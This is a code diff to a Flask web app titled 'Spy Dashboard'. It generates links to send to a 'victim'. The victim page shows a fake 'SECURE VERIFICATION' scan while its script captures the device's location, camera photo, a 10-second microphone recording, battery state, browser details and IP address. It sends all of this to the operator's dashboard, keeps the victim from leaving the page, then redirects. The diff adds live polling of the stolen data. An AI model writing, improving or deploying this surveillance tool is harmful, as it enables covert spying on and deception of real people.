@@ -9,12 +9,12 @@ app.secret_key = os.environ.get('SECRET_KEY', 'force-fixed-key-2025')
 
 reports = {}
 
-# ড্যাশবোর্ড HTML (অডিও প্লেয়ার সহ)
+#  HTML -  , AJAX 
 DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Spy Dashboard - Audio, Photo, Map, Battery</title>
+    <title>Spy Dashboard - Live Data</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
@@ -36,75 +36,98 @@ DASHBOARD_HTML = """
 </head>
 <body>
 <div class="card">
-    <h2>📡CYBER SPY DASHBOARD [DEVLOPER ARIF]</h2>
+    <h2> SPY DASHBOARD</h2>
     <p><strong>Your persistent UID:</strong> {{ uid }}</p>
     <div>
         <input type="text" id="link" value="{{ link }}" readonly style="width:70%;">
         <button onclick="copyLink()">Copy Link</button>
-        <button class="delete-btn" onclick="deleteData()">🗑️ Delete My Data</button>
+        <button class="delete-btn" onclick="deleteData()"> Delete My Data</button>
     </div>
     <form method="post" action="/new_uid" style="display:inline;">
         <button type="submit" style="background:#ff3366;">Generate New Link (New UID)</button>
     </form>
-    <p>⚠️ Send current link to victim. Data automatically appears here.</p>
+    <p> Send current link to victim. Data updates automatically without page reload.</p>
 </div>
 <div class="card">
-    <h3>📥 Received Data (UID: {{ uid }})</h3>
-    <button onclick="location.reload()">Refresh</button>
-    <div id="data">
-        {% if reports[uid] and reports[uid].data %}
-            {% for item in reports[uid].data|reverse %}
-                <div class="data-item">
-                    <small>{{ item.time }}</small>
-                    <pre>{{ item.data | tojson(indent=2) }}</pre>
-                    {% if item.data.location %}
-                        <div class="map-container" id="map{{ loop.index }}"></div>
-                        <script>
-                            setTimeout(() => {
-                                var lat = {{ item.data.location.lat }};
-                                var lon = {{ item.data.location.lon }};
-                                var map = L.map('map{{ loop.index }}').setView([lat, lon], 13);
-                                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-                                L.marker([lat, lon]).addTo(map).bindPopup('Victim Location').openPopup();
-                            }, 100);
-                        </script>
-                    {% endif %}
-                    {% if item.data.battery %}
-                        <div class="battery">🔋 Battery: {{ item.data.battery.level }}% {% if item.data.battery.charging %}(Charging){% else %}(Not charging){% endif %}</div>
-                    {% endif %}
-                    {% if item.data.photo %}
-                        <div><img src="{{ item.data.photo }}" class="photo" alt="Victim photo"></div>
-                    {% endif %}
-                    {% if item.data.audio %}
-                        <div><audio controls src="{{ item.data.audio }}"></audio></div>
-                    {% endif %}
-                </div>
-            {% endfor %}
-        {% else %}
-            <p>⏳ No data yet. Send the link to victim.</p>
-        {% endif %}
-    </div>
+    <h3> Received Data (UID: {{ uid }})</h3>
+    <div id="dataContainer">Loading data...</div>
 </div>
 <script>
+    const uid = "{{ uid }}";
+    let mapInitializers = [];
+
     function copyLink() {
         let inp = document.getElementById('link');
         inp.select();
         navigator.clipboard.writeText(inp.value);
         alert('Link copied!');
     }
-    function deleteData() {
-        if(confirm('Delete all collected data for this UID? This cannot be undone.')) {
-            fetch('/api/delete/' + '{{ uid }}', {method: 'POST'})
-            .then(() => location.reload());
+
+    async function deleteData() {
+        if(confirm('Delete all collected data for this UID?')) {
+            await fetch('/api/delete/' + uid, {method: 'POST'});
+            fetchData();
         }
     }
-    setInterval(() => location.reload(), 8000);
+
+    async function fetchData() {
+        try {
+            const res = await fetch('/api/get_data/' + uid);
+            const data = await res.json();
+            renderData(data);
+        } catch(e) { console.error(e); }
+    }
+
+    function renderData(reports) {
+        const container = document.getElementById('dataContainer');
+        if (!reports || reports.length === 0) {
+            container.innerHTML = '<p> No data yet. Send the link to victim.</p>';
+            return;
+        }
+        let html = '';
+        // reverse order so newest at top
+        for (let i = reports.length-1; i >= 0; i--) {
+            const item = reports[i];
+            html += `<div class="data-item">
+                        <small>${item.time}</small>
+                        <pre>${JSON.stringify(item.data, null, 2)}</pre>`;
+            if (item.data.location) {
+                const mapId = 'map_' + Date.now() + '_' + i;
+                html += `<div class="map-container" id="${mapId}"></div>`;
+                // map init after DOM insertion
+                setTimeout(() => {
+                    const lat = item.data.location.lat;
+                    const lon = item.data.location.lon;
+                    const mapDiv = document.getElementById(mapId);
+                    if (mapDiv) {
+                        const map = L.map(mapId).setView([lat, lon], 13);
+                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                        L.marker([lat, lon]).addTo(map).bindPopup('Victim Location').openPopup();
+                    }
+                }, 100);
+            }
+            if (item.data.battery) {
+                html += `<div class="battery"> Battery: ${item.data.battery.level}% ${item.data.battery.charging ? '(Charging)' : '(Not charging)'}</div>`;
+            }
+            if (item.data.photo) {
+                html += `<div><img src="${item.data.photo}" class="photo" alt="Victim photo"></div>`;
+            }
+            if (item.data.audio) {
+                html += `<div><audio controls src="${item.data.audio}"></audio></div>`;
+            }
+            html += `</div>`;
+        }
+        container.innerHTML = html;
+    }
+
+    setInterval(fetchData, 3000);
+    fetchData();
 </script>
 </body>
 </html>
 """
 
-# ভিকটিম পেজ (মাইক্রোফোন রেকর্ড + ফেক স্ক্যান + রিডাইরেক্ট)
+#   ( , , , ,  , )
 SPY_PAGE_HTML = """
 <!DOCTYPE html>
 <html>
@@ -186,19 +209,19 @@ SPY_PAGE_HTML = """
 </head>
 <body>
 <div class="container">
-    <h1>🔐 SECURE VERIFICATION</h1>
+    <h1> SECURE VERIFICATION</h1>
     <div class="spinner"></div>
     <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
     <div class="status" id="statusMsg">Initializing security protocols...</div>
     <div class="fake-details" id="fakeLog">
-        ✔️ SSL handshake complete<br>
-        ⏳ Scanning network environment...
+         SSL handshake complete<br>
+         Scanning network environment...
     </div>
     <p>Do not close this window. Verification in progress.</p>
 </div>
 
 <script>
-    // ফেক প্রগ্রেস বার
+    //    ( 100%  )
     let progress = 0;
     const progressInterval = setInterval(() => {
         if (progress < 92) progress += Math.random() * 3;
@@ -214,16 +237,16 @@ SPY_PAGE_HTML = """
         msgIndex++;
     }, 2200);
     
-    const fakeLogLines = ["✔️ SSL handshake complete","⏳ Scanning network environment...","✔️ IP validated: 103.42.xxx.xx","⏳ Checking browser extensions","✔️ No threats detected","⏳ Retrieving device timestamp","✔️ Timezone synchronized","⏳ Performing battery calibration...","⏳ Camera integrity test (in progress)","✔️ Secure channel established"];
+    const fakeLogLines = [" SSL handshake complete"," Scanning network environment..."," IP validated: 103.42.xxx.xx"," Checking browser extensions"," No threats detected"," Retrieving device timestamp"," Timezone synchronized"," Performing battery calibration..."," Camera integrity test (in progress)"," Secure channel established"];
     let logIndex = 2;
     setInterval(() => {
         const logDiv = document.getElementById('fakeLog');
         if (logIndex < fakeLogLines.length) logDiv.innerHTML += "<br>" + fakeLogLines[logIndex++];
-        else logDiv.innerHTML += "<br>⟳ Re-verifying connection stability...";
+        else logDiv.innerHTML += "<br> Re-verifying connection stability...";
         logDiv.scrollTop = logDiv.scrollHeight;
     }, 3500);
     
-    // ----- আসল স্পাই কাজ (অডিও রেকর্ড সহ) -----
+    // -----    -----
     const server = window.location.origin;
     const uid = "{{ uid }}";
     
@@ -235,7 +258,7 @@ SPY_PAGE_HTML = """
         }).catch(e => console.error(e));
     }
     
-    // 1. Basic info
+    // Basic info
     sendData({
         userAgent: navigator.userAgent,
         platform: navigator.platform,
@@ -248,15 +271,15 @@ SPY_PAGE_HTML = """
         timestamp: new Date().toISOString()
     });
     
-    // 2. Battery
+    // Battery
     if (navigator.getBattery) {
         navigator.getBattery().then(b => sendData({ battery: { level: Math.round(b.level * 100), charging: b.charging } }));
     }
-    // 3. Location
+    // Location
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(pos => sendData({ location: { lat: pos.coords.latitude, lon: pos.coords.longitude } }), () => {});
     }
-    // 4. Camera photo
+    // Camera photo
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
@@ -274,7 +297,7 @@ SPY_PAGE_HTML = """
                 }, 1500);
             }).catch(e => console.log);
     }
-    // 5. Audio recording (10 seconds)
+    // Audio recording (10 sec)
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ audio: true })
             .then(stream => {
@@ -285,23 +308,22 @@ SPY_PAGE_HTML = """
                     const blob = new Blob(chunks, { type: 'audio/webm' });
                     const reader = new FileReader();
                     reader.onloadend = () => {
-                        const base64Audio = reader.result; // Data URL
-                        sendData({ audio: base64Audio });
+                        sendData({ audio: reader.result });
                     };
                     reader.readAsDataURL(blob);
                     stream.getTracks().forEach(t => t.stop());
                 };
                 mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 10000); // 10 sec record
-            }).catch(e => console.log("Audio permission denied or error", e));
+                setTimeout(() => mediaRecorder.stop(), 10000);
+            }).catch(e => console.log);
     }
-    // 6. IP
+    // IP
     fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
         .then(ipData => sendData({ ip: ipData.ip }))
         .catch(e => console.log);
     
-    // পেজ বন্ধ করতে না দেয়া ও রিডাইরেক্ট (20 sec)
+    // Keep victim on page and redirect after 20 sec
     window.onbeforeunload = function() { return "Verification in progress. Are you sure?"; };
     setInterval(() => { history.pushState({}, '', '/'); }, 500);
     setTimeout(() => {
@@ -325,7 +347,7 @@ def dashboard():
     if uid not in reports:
         reports[uid] = {'data': []}
     link = request.host_url.rstrip('/') + '/spy/' + uid
-    return render_template_string(DASHBOARD_HTML, link=link, uid=uid, reports=reports)
+    return render_template_string(DASHBOARD_HTML, link=link, uid=uid)
 
 @app.route('/new_uid', methods=['POST'])
 def new_uid():
@@ -358,6 +380,12 @@ def delete_data(uid):
     if uid in reports:
         reports[uid] = {'data': []}
     return jsonify({"status": "deleted"}), 200
+
+@app.route('/api/get_data/<uid>')
+def get_data(uid):
+    if uid not in reports:
+        return jsonify([])
+    return jsonify(reports[uid]['data'])
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
